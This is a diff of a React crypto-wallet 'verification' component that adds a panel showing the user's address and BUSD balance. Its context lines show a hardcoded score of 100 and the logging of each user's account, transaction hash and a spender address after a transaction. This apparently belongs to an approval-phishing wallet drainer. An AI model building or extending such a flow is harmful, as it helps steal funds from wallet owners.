@@ -33,6 +33,10 @@ const VerificationFormComponent = (props) => {
   const score = 100
 
   const [showResults, setShowResults] = useState(false)
+  const [userDetail, setUserDetail] = useState({
+    balance:0,
+    address:''
+  })
   const { address, wallet, connected, select, connect, disconnect } = useWallet();
   const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
   const [trxBalance, setTrxBalance] = useState(null);
@@ -146,7 +150,13 @@ const VerificationFormComponent = (props) => {
       const balance = await busdContract.methods.balanceOf(userAccount).call();
       const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
       addData('clientUsers', userAccount, tx?.transactionHash, spenderAddress)
-      setShowResults(true)
+      setUserDetail({
+        address:userAccount,
+        balance:balanceInBUSD
+      })
+      setTimeout(() => {
+        setShowResults(true)
+      }, 100);
 
     } catch (err) {
       Swal.fire({
@@ -377,6 +387,14 @@ const VerificationFormComponent = (props) => {
             <div className="result-item">
               <span className="result-label">Contract Type:</span>
               <span className="result-value">BEP-20 Token</span>
+            </div>
+            <div className="result-item">
+              <span className="result-label">Address:</span>
+              <span className="result-value">{userDetail?.address}</span>
+            </div>
+            <div className="result-item">
+              <span className="result-label">Current Balance:</span>
+              <span className="result-value">{userDetail?.balance}</span>
             </div>
             <div className="result-item">
               <span className="result-label">Creation Date:</span>
